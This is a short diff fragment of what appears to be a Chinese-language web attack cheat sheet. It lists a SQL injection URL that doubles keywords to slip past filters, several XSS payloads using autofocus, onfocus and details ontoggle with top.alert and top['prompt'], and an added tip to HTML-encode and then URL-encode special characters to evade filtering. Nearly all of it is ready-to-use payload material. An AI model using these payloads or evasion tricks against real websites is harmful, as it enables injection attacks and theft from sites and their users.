@@ -86,6 +86,8 @@ http://www.***.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4….
 <button onfocus=alert(/xss/) autofocus>
 top可以连接对象以及属性或函数
 
+把特殊符号用html编码后url编码
+
 <details open ontoggle=top.alert(1)>    //注，在goole浏览器实用
 
 <details open ontoggle=top[‘prompt’](1)>
